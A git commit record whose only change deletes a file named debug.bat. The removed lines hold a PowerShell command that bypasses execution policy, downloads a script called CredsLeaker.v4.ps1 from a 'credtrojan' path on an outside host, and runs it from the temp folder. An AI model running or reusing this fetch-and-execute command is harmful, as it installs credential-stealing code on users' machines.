c34cdf41ce1fad329901754e6146ecc82743e5fd
Dvir S <dviros@me.com>
2021-03-31 12:35:14 +0100

    Delete debug.bat

--- debug.bat
+++
@@ -1,5 +0,0 @@
-powershell -NoP -Exec Bypass "Invoke-RestMethod -uri "https://apsec.dev/scripts/credtrojan/CredsLeaker.v4.ps1" -OutFile $env:TEMP\cl.ps1"; 
-
-Powershell.exe -ExecutionPolicy bypass -nologo -file %TEMP%\cl.ps1
-
-pause
